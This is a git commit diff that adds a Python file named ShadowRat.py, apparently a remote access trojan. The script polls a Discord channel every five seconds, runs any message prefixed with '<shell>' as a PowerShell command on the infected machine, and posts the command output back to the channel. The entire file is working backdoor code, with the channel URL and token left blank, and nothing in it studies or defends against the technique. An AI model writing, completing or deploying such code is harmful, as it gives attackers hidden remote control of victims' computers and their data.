1dca1d93550294160e857053bbc2117dd05fecc9
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-02-23 16:54:34 +0100

    Update ShadowRat.py

---
+++ ShadowRat.py
@@ -0,0 +1,29 @@
+import time
+import requests
+import subprocess
+
+
+url = ""
+discord_token = ""
+
+headers = {
+    "Authorization": discord_token
+}
+
+while True:
+    time.sleep(5)
+    response = requests.get(url + "?limit=1", headers=headers)
+
+    if response.status_code == 200:
+        message_data = response.json()
+
+        if message_data[0]["content"].startswith("<shell>"):
+            print(f"shell is >> {message_data[0]["content"][7:]}")
+
+            result = subprocess.run(["powershell", "-Command", message_data[0]["content"][7:]], capture_output=True, text=True)
+
+            payload = {
+                "content" : result.stdout
+            }
+
+            requests.post(url, payload, headers=headers)
